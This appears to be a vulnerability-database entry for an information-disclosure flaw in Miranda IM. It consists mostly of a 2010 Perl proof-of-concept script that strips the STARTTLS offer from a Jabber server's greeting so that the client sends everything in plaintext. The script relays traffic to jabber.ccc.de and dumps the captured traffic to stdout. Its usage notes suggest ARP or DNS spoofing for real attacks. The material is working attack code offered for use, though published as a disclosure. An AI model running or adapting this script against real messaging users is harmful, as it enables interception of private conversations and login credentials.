source: http://www.securityfocus.com/bid/39209/info

Miranda IM is prone to an information-disclosure vulnerability.

Successful exploits of this issue may allow attackers to perform man-in-the-middle attacks against vulnerable applications and to disclose sensitive information.

#!/usr/bin/perl

# Miranda IM TLS MitM Proof of Concept
# by Jan Schejbal, 2010-03-19

# MAY WORK WITHOUT MODIFICATIONS AGAINST OTHER CLIENTS WITH THIS ISSUE!
# Generally: Will work if client also accepts unencrypted connections
# if the server reports that TLS is not supported.

# Tested only on WinXP SP3 with ActivePerl 5.10.0
# against Miranda 0.8.16

# Usage:
#  1. Setup variables below, unless you want to test against jabber.ccc.de
#       (note that this script does not do real XML parsing. Other servers
#        might have slightly different code that will not be detected.
#        In such a case, connecting will lock up. Adapt the RegExp below.) 
#  2. Make 'victim' connect to this server instead of real server
#       Network->Jabber->Account->Manually specify connection host
#       (real attacks would use ARP spoofing, DNS spoofing or similar.)
#  3. Enable 'Use TLS'
#       (make sure that 'Disable SASL' on advanced is UNCHECKED,
#        as it silently disables TLS!)
#  4. Start script and connect with miranda
#  5. If all works, the dump goes to STDOUT, state is shown on STDERR.
#       (All traffic should be sent in plain now!)


use strict;
use warnings;

use IO::Socket;
use IO::Select;

my $server = 'jabber.ccc.de';
my $port = 5222;
my $listenport = $port;

my $sock = new IO::Socket::INET(
    LocalHost => '0.0.0.0',
    LocalPort => $listenport,
    Proto => 'tcp',
    Listen => 1,
    Reuse => 1,
  );

print STDERR "Listening on $listenport for jabber connections\n";
print STDERR "Will forward to $server:$port\n";
  
my $client_connection = $sock->accept();

print STDERR "Incoming connection\n";

my $server_connection = new IO::Socket::INET(
    PeerAddr => $server,
    PeerPort => $port,
    Proto => 'tcp',
  );

print STDERR "Connected to server\n";

$server_connection->blocking(0);
$client_connection->blocking(0);


my $sel = IO::Select->new();
$sel->add($server_connection);
$sel->add($client_connection);

my $server_hello_done = 0;
my $server_hello_data;

my $readdata;
my @ready;
while(@ready = $sel->can_read()) {
  foreach my $ready_conn (@ready) {
    if (!sysread($ready_conn, $readdata, 10000)) {
      print STDERR "\nReading failed!\n";
      exit(1);
    }
    print "$readdata\n";
    if ($ready_conn == $server_connection) {
      # read was from server
      if (!$server_hello_done) {
        $server_hello_data .= $readdata;
        print STDERR "\nCurrent server hello buf: $server_hello_data\n\n";
        if ($server_hello_data =~ s|<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>||) {
          print STDERR "removed STARTTLS offer from server hello\n";
          $server_hello_done = 1;
          print $client_connection $server_hello_data;
          print STDERR "\nforwarded cached server hello buf: \n$server_hello_data\n\n";
          print STDERR "MitM complete. Forwarding data ('<' = to client, '>' = to server)\n";
        }
      } else {
        print $client_connection $readdata;
        if ($server_hello_done) { print STDERR '<'; }
      }
      
    } else {
      # read was from client, send to server
      print $server_connection $readdata;
      if ($server_hello_done) { print STDERR '>'; }
    }
  }
}
